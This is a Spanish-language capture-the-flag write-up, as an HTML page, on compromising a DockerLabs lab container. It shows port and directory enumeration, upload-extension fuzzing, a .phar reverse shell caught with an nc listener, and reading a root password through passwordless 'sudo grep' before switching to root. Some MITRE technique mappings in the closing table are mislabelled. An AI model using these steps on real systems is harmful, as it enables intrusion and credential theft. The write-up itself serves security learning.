@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Dockerlabs | ZsZsec</title>
+<meta content="Escaneo de Puertos con Nmap El primer paso fue realizar un escaneo completo de puertos y servicios usando nmap con las siguientes opciones: Explicación de las opciones: sS : Escane..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">DockerLabs</p>
+<h1>Maquina Dockerlabs<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / web / gobuster</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">web</span><span class="tag">gobuster</span><span class="tag">burpsuite</span><span class="tag">intruder</span><span class="tag">SUID</span><span class="tag">GTFOBinds</span><span class="tag">grep</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Escaneo de Puertos con Nmap</h1>
+<p>El primer paso fue realizar un escaneo completo de puertos y servicios usando <code>nmap</code> con las siguientes opciones:</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 172.17.0.2 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 17:55 CDT
+Nmap scan report for 172.17.0.2
+Host is up (0.000011s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Dockerlabs
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds
+
+</code></pre>
+<p><strong>Explicación de las opciones:</strong></p>
+<ul>
+<li><code>-sS</code>: Escaneo SYN (rápido y sigiloso)</li>
+<li><code>-sV</code>: Detección de versión del servicio</li>
+<li><code>-Pn</code>: Omite el ping (asume que el host está activo)</li>
+<li><code>-p-</code>: Escanea todos los puertos (1–65535)</li>
+<li><code>-sC</code>: Ejecuta los scripts por defecto de Nmap</li>
+<li><code>--min-rate 5000</code>: Aumenta la velocidad mínima de envío de paquetes</li>
+</ul>
+<p>Resultado del escaneo:</p>
+<pre><code class="language-bash">80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Dockerlabs
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+</code></pre>
+<p>Se detectó únicamente un servicio activo:</p>
+<ul>
+<li><strong>Puerto 80 (HTTP)</strong> sirviendo con <strong>Apache 2.4.58</strong> sobre Ubuntu.</li>
+<li>El título de la página principal es <strong>"Dockerlabs"</strong>.</li>
+<li>No se observaron otros puertos abiertos.</li>
+</ul>
+<h4>Enumeración de Directorios con Gobuster</h4>
+<p>Se ejecutó <code>gobuster</code> para encontrar directorios y archivos ocultos en el servidor web:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,html,py
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/uploads              (Status: 301) [Size: 310] [--&gt; http://172.17.0.2/uploads/]                                                        
+/upload.php           (Status: 200) [Size: 0]
+/index.php            (Status: 200) [Size: 8235]
+/machine.php          (Status: 200) [Size: 1361]
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 2080169 / 6369165 (32.66%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 2080477 / 6369165 (32.66%)
+</code></pre>
+<p><strong>Resultados destacados:</strong></p>
+<ul>
+<li><code>/uploads</code> (redirecciona al contenido subido)</li>
+<li><code>/upload.php</code> (permite subir archivos)</li>
+<li><code>/machine.php</code> (página principal interactiva)</li>
+<li><code>/index.php</code></li>
+</ul>
+<p>Otros recursos como <code>.html</code>, <code>.php</code> y <code>/server-status</code> devolvieron <strong>403 Forbidden</strong>.</p>
+<h4>Carga de Archivos en <code>machine.php</code></h4>
+<p>Al inspeccionar <code>machine.php</code>, se detectó una funcionalidad para subir archivos. Sin embargo, el sistema solo permitía archivos con la extensión <code>.zip</code>.</p>
+<p>Inicialmente se intentó subir una reverse shell (<code>.php</code>), pero fue rechazada por la validación del servidor. Como alternativa, se decidió realizar <em>fuzzing</em> al campo del archivo <code>.zip</code> usando <strong>Burp Suite Intruder</strong>, con el objetivo de encontrar extensiones permitidas dentro del archivo comprimido.</p>
+<h4>Fuzzing de extensiones con Burp Suite</h4>
+<p>Se configuró <strong>Burp Intruder</strong> para probar diferentes extensiones usando la lista <code>common_extensions.txt</code>. Se observó que únicamente los archivos con extensiones <code>.zip</code> y <code>.phar</code> devolvían una respuesta consistente (mismo <strong>Content-Length</strong> de 253), lo cual sugería que ambos tipos eran aceptados.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/9e5c3e42-c9ed-47d8-a17e-c0e17030b164"/></p>
+<h4>Obtención de Reverse Shell</h4>
+<p>Con esta información, se creó un archivo <code>.phar</code> malicioso que contenía una reverse shell PHP. El archivo se subió exitosamente a través de la interfaz, y luego se accedió a él para activar la shell inversa.</p>
+<pre><code class="language-bash">                                                                 
+┌──(zikuta㉿zikuta)-[~/Desktop]
+└─$ nc -lvnp 4444        
+listening on [any] 4444 ...
+connect to [192.168.226.128] from (UNKNOWN) [172.17.0.2] 38076
+Linux 332a950a1003 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64 x86_64 x86_64 GNU/Linux
+ 01:25:18 up  2:08,  0 user,  load average: 0.24, 0.36, 1.43
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>La conexión se recibió correctamente, obteniendo una shell como el usuario <strong>www-data</strong>.</p>
+<h3>Escalada de privilegios – <em>Dockerlabs</em></h3>
+<p>Una vez obtenida la shell como el usuario restringido <code>www-data</code>, procedimos con la fase de <strong>escalada de privilegios</strong> para intentar obtener acceso como <strong>root</strong>.</p>
+<pre><code class="language-bash"> sudo -l
+Matching Defaults entries for www-data on 332a950a1003:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User www-data may run the following commands on 332a950a1003:
+    (root) NOPASSWD: /usr/bin/cut
+    (root) NOPASSWD: /usr/bin/grep
+</code></pre>
+<p>Esto significa que <code>www-data</code> puede ejecutar <code>cut</code> y <code>grep</code> como el usuario <strong>root</strong> sin necesidad de autenticación (<code>NOPASSWD</code>). Esto es muy importante, ya que permite leer archivos arbitrarios del sistema si se usa de forma creativa.</p>
+<h3>Inspección del sistema de archivos</h3>
+<p>Al explorar el sistema de archivos desde la reverse shell, encontramos un archivo interesante en la ruta <code>/opt/nota.txt</code>:</p>
+<pre><code class="language-bash"> ls
+nota.txt
+$ cat nota.txt
+Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
+</code></pre>
+<p>Esto nos indica directamente que el archivo <code>/root/clave.txt</code> contiene la contraseña del usuario root, pero al ser <code>www-data</code>, no tenemos acceso directo a esa ruta.</p>
+<h3>Explotación del binario <code>grep</code> con privilegios de root</h3>
+<p>Sabemos que <code>grep</code> puede leer archivos y mostrarlos por pantalla. Como <code>grep</code> está permitido para <code>sudo</code>, podemos utilizarlo para leer el archivo restringido <code>/root/clave.txt</code> ejecutándolo como root:</p>
+<pre><code class="language-bash">sudo /usr/bin/grep '' /root/clave.txt
+dockerlabsmolamogollon123
+</code></pre>
+<p><strong>Explicación:</strong></p>
+<ul>
+<li>El patrón <code>''</code> (una cadena vacía) coincide con todas las líneas del archivo, por lo que <code>grep</code> imprime todo su contenido.</li>
+<li>El comando se ejecuta como <strong>root</strong>, permitiendo el acceso al archivo normalmente restringido.</li>
+</ul>
+<p>Resultado:</p>
+<pre><code class="language-bash">dockerlabsmolamogollon123
+</code></pre>
+<p>¡Obtenemos la contraseña del usuario root!</p>
+<h3>Escalando a root con <code>su</code></h3>
+<p>Ahora que tenemos la contraseña de root, intentamos cambiar de usuario usando <code>sudo su</code>, pero este comando falló debido a restricciones específicas. En lugar de eso, usamos directamente el comando <code>su - root</code> para iniciar una sesión como root:</p>
+<pre><code class="language-bash"> su - root
+Password: dockerlabsmolamogollon123
+whoami
+root
+</code></pre>
+<h3>Conclusión de la escalada</h3>
+<p>La escalada se logró gracias a una configuración insegura de <code>sudo</code> que permitía al usuario <code>www-data</code> ejecutar <code>grep</code> como root sin contraseña. Combinando esto con la pista encontrada en <code>/opt/nota.txt</code>, accedimos al contenido de <code>/root/clave.txt</code>, y finalmente cambiamos de usuario a <code>root</code> utilizando la contraseña obtenida.</p>
+<p>Esta técnica demuestra la importancia de limitar cuidadosamente los binarios accesibles mediante <code>sudo</code>, incluso si parecen inofensivos, como <code>grep</code>.</p>
+<h1>Tecnicas Utilizadas</h1>
+<table>
+<thead>
+<tr>
+<th>Fase</th>
+<th>Herramienta / Acción</th>
+<th>Descripción técnica</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Escaneo de puertos</td>
+<td><code>nmap</code></td>
+<td>Identificación del servicio HTTP en el puerto 80.</td>
+</tr>
+<tr>
+<td>Enumeración web</td>
+<td><code>gobuster</code></td>
+<td>Detección de rutas sensibles como <code>/upload.php</code> y <code>/uploads/</code>.</td>
+</tr>
+<tr>
+<td>Subida de archivos</td>
+<td>Burp Suite Intruder</td>
+<td>Fuzzing de extensiones dentro de archivos <code>.zip</code>, identificando soporte para <code>.phar</code>.</td>
+</tr>
+<tr>
+<td>Reverse shell</td>
+<td>Archivo <code>.phar</code> con shell PHP</td>
+<td>Ejecución de código remoto al subir y acceder a la shell PHP.</td>
+</tr>
+<tr>
+<td>Enumeración de privilegios</td>
+<td><code>sudo -l</code></td>
+<td>Descubrimiento de binarios <code>grep</code> y <code>cut</code> permitidos como root sin contraseña.</td>
+</tr>
+<tr>
+<td>Lectura de archivos como root</td>
+<td><code>sudo grep '' /root/clave.txt</code></td>
+<td>Abuso del binario <code>grep</code> para leer la clave de root.</td>
+</tr>
+<tr>
+<td>Escalada a root</td>
+<td><code>su - root</code> con la contraseña</td>
+<td>Acceso total como root tras obtener la contraseña desde <code>/root/clave.txt</code>.</td>
+</tr>
+</tbody>
+</table>
+<h1>Mitre Att&amp;ck</h1>
+<table>
+<thead>
+<tr>
+<th>Táctica (MITRE)</th>
+<th>Técnica (ID)</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Discovery</strong></td>
+<td><code>T1087.001</code> – Account Discovery</td>
+<td>Enumeración de comandos <code>sudo -l</code> para ver privilegios del usuario actual.</td>
+</tr>
+<tr>
+<td><strong>Initial Access</strong></td>
+<td><code>T1190</code> – Exploit Public-Facing App</td>
+<td>Subida de archivo <code>.phar</code> con reverse shell vía <code>upload.php</code>.</td>
+</tr>
+<tr>
+<td><strong>Execution</strong></td>
+<td><code>T1059.003</code> – Command and Scripting Interpreter: PHP</td>
+<td>Ejecución de shell PHP en el servidor web.</td>
+</tr>
+<tr>
+<td><strong>Privilege Escalation</strong></td>
+<td><code>T1548.003</code> – Abuse Elevation Control Mechanism: Sudo and Sudo Caching</td>
+<td>Uso de <code>sudo</code> para ejecutar <code>grep</code> como root.</td>
+</tr>
+<tr>
+<td><strong>Credential Access / Discovery</strong></td>
+<td><code>T1552.001</code> – Unsecured Credentials: Credentials in Files</td>
+<td>Lectura de contraseña root desde <code>/root/clave.txt</code>.</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
